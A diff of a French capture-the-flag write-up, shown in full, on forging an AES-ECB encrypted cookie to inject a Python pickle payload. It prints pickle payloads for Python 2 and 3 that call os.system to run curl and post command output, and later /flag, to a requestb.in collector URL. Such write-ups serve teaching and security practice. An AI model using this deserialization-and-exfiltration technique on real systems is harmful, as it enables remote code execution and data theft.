@@ -96,7 +96,7 @@ Ici, on va utiliser le mode ECB pour forger son propre cookie.
 Il suffit de s'enregistrer avec username = 'X' * 18 + pickle(16 octets) et de
 récupérer le 3-ième block.
 
-On va essayer d'éxécuter os.system('curl -X POST -d "$(id)" http://requestb.in/xxxx'), pour ça on utilise python3:
+On va essayer d'éxécuter os.system('curl -X POST -d "$(id)" http://requestb.in/xxxx'):
 
 ```
 class A:
@@ -104,8 +104,13 @@ class A:
         return (os.system, (('curl -X POST -d "$(id)" http://requestb.in/xxxx',),))
 
 print(pickle.dumps(A()))
-b'\x80\x03cposix\nsystem\nq\x00X\x1c\x00\x00\x00curl -X POST -d "$(id)" http://requestb.in/xxxxq\x01\x85q\x02\x85q\x03Rq\x04.'
 ```
+
+### Python 3
+
+En python 3, on obtient:
+
+b'\x80\x03cposix\nsystem\nq\x00X\x1c\x00\x00\x00curl -X POST -d "$(id)" http://requestb.in/xxxxq\x01\x85q\x02\x85q\x03Rq\x04.'
 
 Le problème, c'est que ce payload contient des octets > 128.
 Le champ username attend de l'UTF-8, comme on peut se douter. Si l'on injecte
@@ -133,6 +138,19 @@ Au final, voici mon payload:
 On push os.system, puis un marker, puis notre commande, puis on utilise t pour
 pop tout jusqu'au marker et construire un tuple, puis on appel reduce.
 
+### Python 2
+
+En python 2, on obtient:
+
+'cposix\nsystem\np0\n((S\'curl -X POST -d "$(id)" http://requestb.in/xxxx\'\np1\ntp2\ntp3\nRp4\n.'
+
+Ce qui ne pose aucun soucis comparé à python 3.
+
+### Injection du payload
+
+NOTE: Au final, l'utilisateur peut crafter son payload avec python 2 ou
+python 3, ça devrait marcher (modulo l'UTF-8, voir plus haut).
+
 Ensuite, il suffit de jouer avec les blocks pour former le cookie souhaité. On
 veut obtenir: AES(PICKLE([user_id, 'X' * 18, pickle, ...]))
 
@@ -143,4 +161,4 @@ On concatène tout ça, et on fait une requête HTTP avec ce cookie, et bim, le
 serveur éxécute notre commande.
 
 Ensuite, on a un shell. Il suffit de remplacer id par la commande voulue.
-Pour terminer, on cat /flag
+Pour terminer, on cat /flag, et le résultat doit apparaitre dans le requestb.in
